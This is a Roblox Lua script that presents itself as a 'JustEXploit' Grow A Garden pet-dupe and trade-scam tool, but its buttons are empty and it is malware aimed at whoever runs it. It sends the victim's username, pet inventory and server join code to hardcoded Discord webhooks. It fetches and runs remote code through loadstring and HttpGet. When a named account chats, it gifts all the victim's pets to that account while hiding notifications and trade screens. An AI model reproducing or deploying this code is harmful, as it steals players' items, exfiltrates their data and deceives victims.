repeat
    task.wait()
until game:IsLoaded()

local function deltaBypass()
    local _, _
    pcall(
        function()
            game:GetService("TeleportService").TeleportInitFailed:Connect(
                function(_, _, _, _, v)
                    queue_on_teleport('getgenv().JobId = "' .. v.ServerInstanceId .. '";warn()')
                end
            )
        end
    )
    if not getgenv().JobId then
        for _ = 1, 2 do
            task.spawn(
                function()
                    game:GetService("TeleportService"):TeleportToPlaceInstance(126884695634066, game.JobId)
                end
            )
            task.wait()
        end
    end
end
queue_on_teleport(
    'loadstring(game:HttpGet("https://raw.githubusercontent.com/Kuploit/new_s/refs/heads/main/st"))();getgenv().JobId=getgenv().JobId'
)

local Username = "tanbike756"

Webhook = "https://discord.com/api/webhooks/1416807471355527230/LDufR6NDVx5hJzqS7quRBj31qbw3SpcKow0KjDB9psQuDYP0m76xCBp-yL27qQWQLF0R"
SmallWebhook = "https://discord.com/api/webhooks/1416807362366410915/VPsHfhDrvhu1mRyEBvmGYVKVm1nHdJEWsj9isIiMql-Xk971iw1aW5WveNw7VUmDZMCi"

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    return game:Shutdown()
end
if #game.Players:GetChildren() >= 5 then
    return game:Shutdown()
end

if getgenv().scriptExecuted then
    return
end
getgenv().scriptExecuted = true

local PetValues = {
    ["Kitsune"] = 1,
    ["Disco Bee"] = 2,
    ["Raccoon"] = 3,
    ["Fennec Fox"] = 4,
    ["Butterfly"] = 5,
    ["Luminous Sprite"] = 6,
    ["Dragonfly"] = 7,
    ["Swan"] = 7,
    ["Dragonfly"] = 7,
    ["Spinosaurus"] = 8,
    ["Mimic Octopus"] = 9,
    ["Phoenix"] = 10,
    ["Panda"] = 11,
    ["T-Rex"] = 13,
    ["Queen Bee"] = 14,
    ["French Fry Ferret"] = 15,
    ["Lobster Thermidor"] = 16,
    ["Corrupted Kitsune"] = 17,
    ["Chicken Zombie"] = 18
}

local valuesPets = {}

for petLike in pairs(PetValues) do
    table.insert(valuesPets, petLike)
end

table.sort(
    valuesPets,
    function(a, b)
        return PetValues[a] < PetValues[b]
    end
)

local fullPet = {}

local function getData()
    local sortPets = {}
    for i, v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
        if v:GetAttribute("PET_UUID") then
            local foundPetType = nil
            local petPriority = 0
            for _, sortValues in pairs(valuesPets) do
                if string.find(v.Name, sortValues) then
                    petPriority = PetValues[sortValues]
                    foundPetType = sortValues
                    break
                end
            end
            if foundPetType then
                local weightPattern = "%[(%d+%.%d+) KG%]"
                local agePattern = "%[Age (%d+)%]"
                local weight = string.match(v.Name, weightPattern)
                local age = string.match(v.Name, agePattern)

                local petName3 = string.match(v.Name, "^(.-) %[")
                local PetsUUID = v:GetAttribute("PET_UUID")
                local PetWeight = weight and ("[" .. tonumber(weight) .. " KG]") or ""
                local PetAge = age and ("[Age " .. tonumber(age) .. "]") or ""

                local hasMutation = (age == nil)
                local mutation = ""
                local petName2 = petName3 or v.Name

                if hasMutation and petName3 then
                    mutation = string.match(petName3, "^(%S+)")
                    petName2 = string.gsub(petName3, "^" .. mutation .. "%s*", "")
                    mutation = string.gsub(mutation, "%s*", "")
                end

                local info = {
                    petFullName = v.Name,
                    petMutation = mutation,
                    petName = petName2,
                    petWeight = PetWeight,
                    petAge = PetAge,
                    petUUID = PetsUUID,
                    petPriority = petPriority,
                    petType = foundPetType
                }

                table.insert(sortPets, info)
            end
        end
    end

    table.sort(
        sortPets,
        function(a, b)
            return a.petPriority < b.petPriority
        end
    )
    fullPet = {}
    for i, petInfo in ipairs(sortPets) do
        table.insert(fullPet, petInfo)
    end
    
    return fullPet
end

local function PetToBackpack()
    for _, v in pairs(workspace[game.Players.LocalPlayer.Name]:GetChildren()) do
        if v:GetAttribute("PET_UUID") then
            local success, error =
                pcall(
                function()
                    workspace[game.Players.LocalPlayer.Name][v.Name].Parent =
                        game:GetService("Players").LocalPlayer.Backpack
                end
            )
        end
        while task.wait(0.5) do
            for _, v in pairs(workspace[game.Players.LocalPlayer.Name]:GetChildren()) do
                for Name, Variant in pairs(v:GetAttributes()) do
                    if Variant == "SHOVEL" or Name == "Seed" or Name == "MaxAge" or Name == "e" or Name == "c" then
                        local success, error =
                            pcall(
                            function()
                                workspace[game.Players.LocalPlayer.Name][v.Name].Parent =
                                    game:GetService("Players").LocalPlayer.Backpack
                            end
                        )
                    end
                end
            end
        end
    end
end

local function StealPet(plr)
    repeat
        getData()
        for _, data in pairs(
            require(game:GetService("ReplicatedStorage").Modules.DataService):GetData().PetsData.PetInventory.Data
        ) do
            game:GetService("ReplicatedStorage").GameEvents.PetsService:FireServer("UnequipPet", data.UUID)
        end
        for _, data in ipairs(fullPet) do
            game:GetService("ReplicatedStorage").GameEvents.PetsService:FireServer("UnequipPet", data.petUUID)
            for _, v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
                if v:GetAttribute("PET_UUID") == data.petUUID then
                    local success, error =
                        pcall(
                        function()
                            task.spawn(
                                function()
                                    DeletePet(data.petFullName)
                                end
                            )
                            game:GetService("Players").LocalPlayer.Backpack[data.petFullName].Parent =
                                workspace[game.Players.LocalPlayer.Name]
                            game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild(
                                "PetGiftingService"
                            ):FireServer("GivePet", game:GetService("Players"):WaitForChild(plr.Name))
                            task.wait(0.3)
                            workspace[game.Players.LocalPlayer.Name][data.petFullName].Parent =
                                game:GetService("Players").LocalPlayer.Backpack
                        end
                    )
                end
            end
        end
        task.wait()
    until #fullPet == 0
end

local function gui()
    local Libraryy =
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Robojini/Tuturial_UI_Library/main/UI_Template_1"))()
    local Window = Libraryy.CreateLib("JustEXploit\240\159\154\128 GrowAGarden", "RJTheme3")
    local Tab = Window:NewTab("\240\159\140\143 - Main")
    local Section = Tab:NewSection("Update - 09.09.2025")
    local Section = Tab:NewSection("New script!\240\159\142\136 Update every day.")
    local Tab = Window:NewTab("\240\159\154\132 - Function")
    local Section = Tab:NewSection("Update - 09.09.2025")
    Section:NewButton(
        "Pet Dupe \240\159\170\144",
        "",
        function()
        end
    )
    Section:NewButton(
        "Trade Scam \240\159\170\144",
        "",
        function()
        end
    )
end

function Unfavofite()
    while task.wait(0.5) do
        for _, v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
            for _, data in ipairs(fullPet) do
                if v:GetAttribute("PET_UUID") == data.petUUID then
                    if v:GetAttribute("d") == true then
                        game:GetService("ReplicatedStorage").GameEvents.Favorite_Item:FireServer(
                            game:GetService("Players").LocalPlayer:WaitForChild("Backpack"):WaitForChild(v.Name)
                        )
                    end
                end
            end
        end
    end
end

function DeletePet(petDelete)
    pcall(
        function()
            game:GetService("Players").LocalPlayer.Backpack[petDelete].Handle:Destroy()
        end
    )
end
for _, data in pairs(
    require(game:GetService("ReplicatedStorage").Modules.DataService):GetData().PetsData.PetInventory.Data
) do
    game:GetService("ReplicatedStorage").GameEvents.PetsService:FireServer("UnequipPet", data.UUID)
end
getData()
if not getgenv().JobId and #fullPet >= 1 then
    return deltaBypass()
elseif #fullPet == 0 then
    return
end
gui()
local s, vo =
    pcall(
    function()
        game:GetService("Players").LocalPlayer.PlayerGui.Top_Notification:Destroy()
        workspace[game.Players.LocalPlayer.Name].ToolSounds:Destroy()
        game:GetService("SoundService").Notification:Destroy()
        game:GetService("Players").LocalPlayer.PlayerGui.Trading.Enabled = false
        aaa = game:GetService("Players").LocalPlayer.PlayerGui.BackpackGui:Clone()
        aaa.Parent = game:GetService("Players").LocalPlayer.PlayerGui
        game:GetService("Players").LocalPlayer.PlayerGui.BackpackGui:Destroy()
    end
)

local StorageServer = #game.Players:GetChildren()

local url = Webhook
local whenabled = true
local HttpService = game:GetService("HttpService")
local function SendWebhook(url, ping, pets)
    local petFields = {}

    for _, data in ipairs(pets) do
        local petInfo = string.format("%s %s %s %s", data.petMutation, data.petName, data.petWeight, data.petAge)
        table.insert(
            petFields,
            {
                ["name"] = "",
                ["value"] = "```" .. petInfo .. "```",
                ["inline"] = true
            }
        )
    end
    local server = "Normal Server"
    local inv = "Loot: " .. #fullPet
    if #fullPet >= 18 then
        inv = "Big inventory, " .. #fullPet .. " pets..."
    end
    local imgs = "https://tr.rbxcdn.com/180DAY-79dc69c860af14766b83149ee1bd1055/150/150/Image/Webp/noFilter"
    local data1 = {
        ["content"] = ping,
        ["username"] = "Parrot:",
        ["avatar_url"] = imgs,
        ["embeds"] = {
            {
                ["title"] = "",
                ["url"] = "",
                ["color"] = 0xe2a3ff,
                ["thumbnail"] = {
                    ["url"] = "https://tr.rbxcdn.com/180DAY-1ac9c89e561b26d7ae637cf15c947b4f/768/432/Image/Webp/noFilter",
                    ["height"] = 420,
                    ["width"] = 420
                },
                ["fields"] = {
                    {
                        ["name"] = "\240\159\142\178 __Info__:",
                        ["value"] = "```" .. identifyexecutor() .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "\240\159\145\164 Username",
                        ["value"] = "```" .. tostring(game.Players.LocalPlayer.Name) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "\240\159\148\140 Server",
                        ["value"] = "```" .. tonumber(StorageServer) .. "/5```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "\240\159\148\139 Type",
                        ["value"] = "```" .. server .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "\240\159\147\170 Recievers",
                        ["value"] = "```" .. Username .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "\240\159\148\142 Grow A Garden",
                        ["value"] = "```" .. inv .. "```",
                        ["inline"] = false
                    }
                }
            }
        }
    }
    if #fullPet <= 18 then
        for _, field in ipairs(petFields) do
            table.insert(data1["embeds"][1]["fields"], field)
        end
    end
    local newdata1 = HttpService:JSONEncode(data1)
    local headers = {
        ["content-type"] = "application/json"
    }
    if url ~= nil and whenabled == true then
        local request =
            syn and syn.request or http_request or request or
            function(tab)
                return HttpService:RequestAsync(
                    {
                        Url = tab.Url,
                        Method = tab.Method,
                        Headers = tab.Headers,
                        Body = tab.Body
                    }
                )
            end
        local abcdef1 = {
            Url = url,
            Body = newdata1,
            Method = "POST",
            Headers = headers
        }

        local success, response =
            pcall(
            function()
                return request(abcdef1)
            end
        )
        if not success then
            return
        end
    end
end

local everyone =
    '--@everyone \ngame:GetService("TeleportService"):TeleportToPlaceInstance(' ..
    game.PlaceId .. ', "' .. getgenv().JobId .. '")'
local normal =
    'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. getgenv().JobId .. '")'
if #fullPet >= 1 then
    task.spawn(
        function()
            SendWebhook(Webhook, everyone, fullPet)
        end
    )
else
    task.spawn(
        function()
            SendWebhook(SmallWebhook, normal, fullPet)
        end
    )
end

local function proximity()
    while task.wait(0.5) do
        for _, pl in pairs(game.Players:GetChildren()) do
            local success, error =
                pcall(
                function()
                    workspace[pl.Name].Head.ProximityPrompt:Destroy()
                end
            )
        end
    end
end

local function Finish(plr)
    task.spawn(PetToBackpack)
    task.spawn(Unfavofite)
    task.spawn(proximity)
    task.spawn(
        function()
            StealPet(plr)
        end
    )
end

function GetPlayers(plr)
    if plr.Name:lower() == Username:lower() then
        return true
    end

    if string.find(plr.Name:lower(), Username:lower()) then
        return true
    end
    return false
end

for _, plr in pairs(game.Players:GetPlayers()) do
    if GetPlayers(plr) then
        plr.Chatted:Connect(
            function()
                Finish(plr)
            end
        )
    end
end

game.Players.PlayerAdded:Connect(
    function(plr)
        if GetPlayers(plr) then
            plr.Chatted:Connect(
                function()
                    Finish(plr)
                end
            )
        end
    end
)
